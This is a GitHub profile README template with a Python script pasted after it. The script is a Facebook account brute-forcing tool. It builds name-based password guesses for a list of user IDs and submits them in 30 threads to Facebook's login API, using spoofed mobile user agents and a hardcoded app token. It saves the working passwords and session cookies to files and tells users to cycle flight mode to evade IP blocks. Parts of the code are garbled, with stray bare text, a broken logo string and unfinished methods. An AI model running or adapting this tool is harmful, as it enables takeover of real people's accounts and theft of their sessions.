- 👋 Hi, I’m @rajeshvy
- 👀 I’m interested in ...
- 🌱 I’m currently learning ...
- 💞️ I’m looking to collaborate on ...
- 📫 How to reach me ...

<!---
rajeshvy/rajeshvy is a ✨ special ✨ repository because its `README.md` (this file) appears on your GitHub profile.
You can click the Preview link to take a look at your changes.
--->
import os
import sys
import re
import random,zlib
import time
from time import sleep as sp
import string,json
import subprocess
import base64,uuid
from requests.exceptions import ConnectionError as CError
from concurrent.futures import ThreadPoolExecutor as tpd
try:
    import requests
except ImportError:
    os.system('pip install requests')


ses = requests.Session()

id = []
ok = []
cp =[]
loop = 0
pwx = []
method = []


##______COLORS____ARE________######
pwx=[]
W = '\033[97;1m'
R = '\033[91;1m'
G = '\033[92;1m'
Y = '\033[93;1m'
B = '\033[94;1m'
P = '\033[95;1m'
S = '\033[96;1m'
N = '\x1b[0m'
PURPLE ='\x1b[38;5;46m'
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m'
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
BLACK="\033[1;30m"
EXTRA ='\x1b[38;5;208m'
#________________________________________#
def clear():
    os.system("clear")

def line():
    print(52*'-')
def p(x):
    print(x)

def logo():
    logo =f"""{WHITE}
RR   RR  AA   
AA       UU
JJ       AA
EE AA    MM
SS    GG
HH      JJJ
NN         AA
~Y8888P' `8888Y' YP  YP  YP Y888888P Y888888P  {BLUE}X {RED}PATHANI {
t[Ã—] Developed By RAJESH BC{EXTRA} (RAJESH)
{WHITE}[â€¢] AUTHOR       : RAJESH BC
{WHITE}[â€¢] WhatsApp     : +9779800658359
[â€¢] FaceBook     :   Rajesh Bc
[â€¢] Version      :   {RED}1.0
{WHITE}[â€¢] YouTube      :   Ransh bc

{WHITE}========HATERXX========FEEL========PAPA==================ðŸ’”======

{WHITE}========I========HATE========FAKE===========PEOPLE========ðŸ’”======"""
    print('\33[1;37m----------------------------------------------')
    p(logo) 


ua3 = "YAHN APNY 3RD USER AGENT LGANY HE "



ua2 = ' YH 2ND USERAGENTS LGALO METHOD 2 KY LIYE'
USER AGENT FUNCTION UA 1 METHOD 1
def iAmAndroidUa():
    # YHN APNY ESE ANDROID KY UA LGANY HE MNE EXAMPLE KY LIYE IPHONE KY LGAY
    ios_version = random.choice(["10_0_2","10_1_1","10_2","10_2_1","10_3_1","10_3_2","10_3_3"])
    END = "[FBAN/FBIOS;FBAV/{str(random.randint(111,999))+'.0.0.'+str(random.randrange(1,30))+'.'+str(random.randint(111,999))};FBBV/{FBBV};FBDV/iPhone10,{random.choice(['1','5'])};FBMD/iPhone;FBSN/iOS;FBSV/{(ios_version).replace('_','.')};FBSS/2;FBCR/{random.choice(['Jazz','Zong'])};FBID/phone;FBLC/en_US;FBOP/5;FBRV/{random.choice(['106631002','0'])}]"
    ua = random.choice(["Dalvik/2.1.0 (Linux; U; Android 11; moto g(20) Build/RTAS31.68-66-4)","Dalvik/2.1.0 (Linux; U; Android UpsideDownCake Build/UPB1.230309.017)","Dalvik/2.1.0 (Linux; U; Android 12; SHG05 Build/SB041)","Dalvik/2.1.0 (Linux; U; Android 10; TIMVISIONBOX Build/QTG1.220427.001)","Dalvik/2.1.0 (Linux; U; Android 13; SO-41B Build/60.3.A.0.444)","Dalvik/2.1.0 (Linux; U; Android 7.1.2; GRUNHELM Build/GX-96MINI)","Dalvik/2.1.0 (Linux; U; Android 13; SM-G715U1 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 6.0.1; TrekStor SurfTab breeze 9.6 quad 3G Build/MMB29M)","Dalvik/2.1.0 (Linux; U; Android 11; MBOX Build/RQ2A.210505.003)","Dalvik/2.1.0 (Linux; U; Android 12; ELS-AN00 Build/HUAWEIELS-AN00)","Dalvik/2.1.0 (Linux; U; Android 12; moto g72 Build/S3SVS32.45-28-1-4)","Dalvik/2.1.0 (Linux; U; Android 12; TECNO BF6 Build/SP1A.210812.001)","Dalvik/2.1.0 (Linux; U; Android 9; S30_EEA Build/PPR1.180610.011)","Dalvik/2.1.0 (Linux; U; Android 12; GM1911 Build/SKQ1.211113.001)","Dalvik/1.6.0 (Linux; U; Android 4.4.2; HiDPTAndroid_Hi3751V530 Build/KOT49H)","Dalvik/2.1.0 (Linux; U; Android 13; SO-52B Build/62.2.B.0.416)","Dalvik/2.1.0 (Linux; U; Android 12; V2127 Build/SP1A.210812.003_NONFC)","Dalvik/2.1.0 (Linux; U; Android 13; V2219 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 13; XQ-CT72 Build/64.1.A.0.891)","Dalvik/2.1.0 (Linux; U; Android 12; Armor X10 Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 9; Acer Chromebook R13 (CB5-312T) Build/R112-15359.45.0)","Dalvik/2.1.0 (Linux; U; Android 13; I2202 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 11; QBELL Android TV Build/RTO5.230306.001)","Dalvik/2.1.0 (Linux; U; Android 11; SM-A705FN Build/RP1A.200720.012) PB/102","Dalvik/2.1.0 (Linux; U; Android 11; moto e30 Build/ROPS31.166-72-5) VD/221","Dalvik/2.1.0 (Linux; U; Android 11; moto g(9) play Build/RPXS31.Q2-58-17-7-3) VD/221","Dalvik/2.1.0 (Linux; U; Android 13; moto e13 Build/TLA33.105-42-27)","Dalvik/2.1.0 (Linux; U; Android 12; moto g(50) 5G Build/S1RSS32.38-20-9-9)","Dalvik/2.1.0 (Linux; U; Android 11; WALPAD8G Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 1.0; IMPulse K1 Build/PPR1.180610.011)","Dalvik/2.1.0 (Linux; U; Android 13; SM-G9900 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 9; AFTSHN01 Build/PS7636.3472N)","Dalvik/2.1.0 (Linux; U; Android 11; SM-G970U","Dalvik/2.1.0 (Linux; U; Android 13; CPH2413 Build/TP1A.220905.001)","Dalvik/2.1.0 (Linux; U; Android 13.0; ums512_1h10_Natv Build/QP1A.190711.020)","Dalvik/2.1.0 (Linux; U; Android 9; AFTTI43 Build/PS7633.3449N)","Dalvik/1.6.0 (Linux; U; Android 4.0.4; SO-03D Build/6.1.F.0.128)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ2A.230405.003.G1)","Dalvik/2.1.0 (Linux; U; Android 11; CP20 Build/RP1A.201105.002)","Dalvik/2.1.0 (Linux; U; Android 5.1; M-MPB10E Build/LMY47I)","Dalvik/2.1.0 (Linux; U; Android 12; XQ-AQ62 Build/58.2.A.10.240)","Dalvik/2.1.0 (Linux; U; Android 13; M2012K11AC Build/TKQ1.220829.002)","Dalvik/2.1.0 (Linux; U; Android 12; S8-KC Build/3.250SI.0359.a)","Dalvik/2.1.0 (Linux; U; Android 13; FP4 Build/TQ2A.230405.003.E1)","Dalvik/2.1.0 (Linux; U; Android 9; KFTRPWI Build/PS7328.3432N)","Dalvik/2.1.0 (Linux; U; Android 10; 701SH Build/S2002)","Dalvik/2.1.0 (Linux; U; Android 9; Qilive FHD Android TV Build/PTO2.220426.001)","Dalvik/2.1.0 (Linux; U; Android 11; SM-A405FN Build/RP1A.200720.012) VD/221","Dalvik/2.1.0 (Linux; U; Android 8.1.0; Moto X Play Build/OPM8.190505.001)","Dalvik/2.1.0 (Linux; U; Android 12; SM-A025F Build/SP1A.210812.016) VD/221","Dalvik/2.1.0 (Linux; U; Android 12; 220733SG Build/SP1A.210812.016) VD/221","Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-G930F Build/R16NW) VD/221","Dalvik/2.1.0 (Linux; U; Android 11; dedede Build/R112-15359.58.0)","Dalvik/2.1.0 (Linux; U; Android 12; SL004T Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; Hisense M50 Lite Build/OPM2.171019.012)","Dalvik/2.1.0 (Linux; U; Android 11; moto e30 Build/ROP31.166-76)","Dalvik/2.1.0 (Linux; U; Android 13; XQ-BQ72 Build/61.2.A.0.410)","Dalvik/2.1.0 (Linux; U; Android 13; V2231 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 13; moto g53 5G Build/T1TP33.75-20)","Dalvik/2.1.0 (Linux; U; Android 10; TE081 Build/QP1A.190711.020)","Dalvik/2.1.0 (Linux; U; Android 11; V2190A Build/RP1A.200720.012)","Dalvik/2.1.0 (Linux; U; Android 11; NE2211 Build/SKQ1.220617.001)","Dalvik/2.1.0 (Linux; U; Android 7.1.2; Vestel_5000_2gb Build/2.32.0)","Dalvik/2.1.0 (Linux; U; Android 11; Doro 8100 Build/S10A_611)","Dalvik/2.1.0 (Linux; U; Android 11; Nokia C2 2nd Edition Build/RP1A.200720.011; BroadcastDotRadioApp )","Dalvik/2.1.0 (Linux; U; Android 12; moto g(50) 5G Build/S1RSS32.38-20-7-12)","Dalvik/2.1.0 (Linux; U; Android 13; 2109119DI Build/TKQ1.220829.002)","Dalvik/2.1.0 (Linux; U; Android 8.0.0; Xperia Z3 Build/OPR3.170623.013)","Dalvik/2.1.0 (Linux; U; Android 12; moto g pure Build/S3RHS32.20-42-10-4-2-8)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; M26 Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 6.0; HDT-7435G4 Build/MRA58K)","Dalvik/2.1.0 (Linux; U; Android 10; BRAVIA 4K VH2 Build/QTG3.200305.006.S292)","Dalvik/2.1.0 (Linux; U; Android 12; SM-A326B Build/SP1A.210812.016) VD/221","Dalvik/2.1.0 (Linux; U; Android 11; 2201117TI Build/RKQ1.211001.001) VD/213","Dalvik/2.1.0 (Linux; U; Android 10; SM-A013M Build/QP1A.190711.020) PB/102","Dalvik/2.1.0 (Linux; U; Android 8.1.0; Vibe K5 Plus Build/OPM7.181205.001)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; TZ797 Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 12; Infinix X6815C Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 13; PGT110 Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 5a Build/TQ2A.230405.003)","Dalvik/2.1.0 (Linux; U; Android 6.0; VK815 Build/MRA58K)","Dalvik/2.1.0 (Linux; U; Android 13; moto e13 Build/TLA33.105-42-8)","Dalvik/2.1.0 (Linux; U; Android 12; moto g31 Build/S3RWBS32.125-29-2-5)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; T98_box Build/OPM6.171019.030.B1)","Dalvik/2.1.0 (Linux; U; Android 11; MS5424G Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 10; RCT6716Q25 Build/QP1A.190711.020)","Dalvik/1.6.0 (Linux; U; Android 4.2.2; RCS13101T Build/JDQ39)","Dalvik/2.1.0 (Linux; U; Android 11; SK3404 Build/RQ3A.210705.001)","Dalvik/2.1.0 (Linux; U; Android 5.1; Cynus F7 Build/LMY47D)","Dalvik/2.1.0 (Linux; U; Android 12; motorola one 5G UW ace Build/S3RVS32.128-36-4-1)","Dalvik/2.1.0 (Linux; U; Android 7.1.2; AFTA Build/NS6296)","Dalvik/2.1.0 (Linux; U; Android 5.1; Impress Style Build/LMY47I)","Dalvik/2.1.0 (Linux; U; Android 9; cherry Build/R112-15359.58.0)","Dalvik/2.1.0 (Linux; U; Android 13; SM-A546E Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 13; V2031_21 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 13; LGE-NX9 Build/HONORLGE-N49)","Dalvik/2.1.0 (Linux; U; Android 10; MAXI 20 Build/QP1A.190711.020)","Dalvik/2.1.0 (Linux; U; Android 9; HRY-LX1 Build/HONORHRY-LX1)","Dalvik/2.1.0 (Linux; U; Android 9; andrino 2K Android TV Build/PTO6.220120.001)","Dalvik/1.6.0 (Linux; U; Android 4.4.2; VS880 Build/KOT49I.VS88010B)",])+END
    return ua


class Main:
    def __init__(self):
        os.system('clear')
    def saved_results(self,ok,cp):
        if len(ok) != 0 or len(cp) != 0:
            p('\n')
            line()
            p(' [â€¢] Cloning Process Has Been Completed ')
            p(' [â€¢] Total OK Accounts : %s '%(len(ok)))
            p(' [â€¢] Total CP Accounts : %s '%(len(cp)))
            line()
            input(' [â€¢] Press Enter To Go Back To Main Menu ')
            self.menu()
    def menu(self):
        logo()
        p(' [â€¢] INSHALLAH DAILY UPDATES')
        line()
        p(' [1] File Cracking ')
        p(" [2] Join Facebook Group ")
        p(' [3] Join Whatsapp Group ')
        line()
        m_1 = input(' [â€¢] Choose : ')
        if m_1 == '1':
            self.methods_menu()
        elif m_1 == '2':
            os.system('xdg-open https://facebook.com/groups/828047231455910//')
            sp(1)
            self.menu()
        elif m_1 =='3':
            os.system('xdg-open https://chat.whatsapp.com/Jv6uZwbW5so4zCQml49xBA')
        else:
            p(' [â€¢] Wrong Select Hai Bhosdikay ')
            sp(1)
            self.menu()
    def methods_menu(self):
        line()
        p(' [1] Method 1 \n [2] Method 2 \n [3] Method 3')
        line()
        m_2 = input(' [â€¢] Select Method : ')
        if m_2 == '1':
            method.append('i')
            self.cracking()
        elif m_2 == '2':
            method.append('ii')
            self.cracking()
        elif m_2 == '3':
            method.append('iii')
            self.cracking()
        else:
            p(' [â€¢] Wrong Select Hai Bhosdikay ')
            sp(1)
            self.methods_menu()

    def cracking(self):
        clear()
        logo()
        try:
            file = input(' [â€¢] Put File Path : ')
            id = open(file).read().splitlines()
            self.password_menu(id)
        except FileNotFoundError:
            p(' [X] File Path Wrong....')
            sp(2)
            self.cracking()

    def password_menu(self,id):
        clear()
        logo()
        p(' [â€¢] Enter Password Limit Between 1 to 20 (Max) ')
        try:
            plimit = int(input(' [â€¢] Put Limit : '))
            if plimit == '':
                plimit = 4
            elif plimit > 20:
                limit = 10
        except:
            plimit = 4
        clear();logo()
        print(' [â€¢] Example : first123,last1122,firstlast,last Etc ')
        for n in range(plimit):
            pwx.append(input(' [â€¢] Put Password %s : '%(n+1)))
        clear();logo()
        p(' [â€¢] Usmi Brute Has Been Started ')
        line()
        p(' [â€¢] Total Clone Accounts :  %s '%(len(id)))
        line()
        p(' [â€¢] Use Flight Mood On Bhsdk Ip Lol Ha ')
        line()
        with tpd(max_workers=30) as saqi:
            for user in id:
                uid,nm = user.split('|')
                if 'i' in method:
                    saqi.submit(self.method1,uid,nm,pwx)
                elif 'ii' in method:
                    saqi.submit(self.method2,uid,nm,pwx)
                elif 'iii' in method:
                    saqi.submit(self.method3,uid,nm,pwx)
        self.saved_results(ok,cp)

    def method1(self,uid,nm,pwx):
        try:
            global ok , cp , loop
            sys.stdout.write('\r [USMII-FIRE] %s | M1 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
            fn = nm.split(' ')[0]
            try:
                ln = nm.split(' ')[1]
            except:
                ln = fn
            for ps in pwx:
                pw = ps.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',nm).replace('name',nm.lower())
                data = {"adid": str(uuid.uuid4()),
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "device_based_login",
"email": uid,
"password": pw,
"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "",
"advertiser_id": str(uuid.uuid4()),
"currently_logged_in_userid": "0",
"locale": "en_GB",
"client_country_code": "GB",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}
                headers = {'User-Agent': iAmAndroidUa(),
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': str(random.randint(20000, 40000)),
'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
'X-FB-Connection-Type': 'MOBILE.LTE',
'X-Tigon-Is-Retry': 'False',
'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
'x-fb-device-group': '5120',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
                q = ses.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()

                if "session_key" in q:
                    coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                    cookie = f"sb={sb};{coki}"
                    p('\r\033[1;92m[LEGEND-USMII-OK] %s | %s \033[1;97m '%(uid,pw))
                    ok.append(uid)
                    open('/sdcard/USMII_M1_OK.txt','a').write(uid+'|'+pw+'\n')
                    open('/sdcard/USMII_M1_COOKIES.txt','a').write(uid+'|'+pw+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    p('\r\033[1;91m[ALONE-USMII-CP] %s | %s \033[1;97m '%(uid,pw))
                    cp.append(uid)
                    open('/sdcard/ALONE_M1_CP.txt','a').write(uid+'|'+pw+'\n')
                    break
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
                self.method1(uid,nm,pwx)

    def method2(self,uid,nm,pwx):
        #YE METHOD 2 HE
        print(" [ METHOD 2] YHN AP 2ND METHOD LGALO ...")
        exit()

    def method3(self,uid,nm,pwx):
        #YE METHOD 3 HE
        print(" [ METHOD 3 ] YHN AP 3RD METHOD LGALO ...")
        exit()

        exit()
if __name__=="__main__":
    Main().menu()
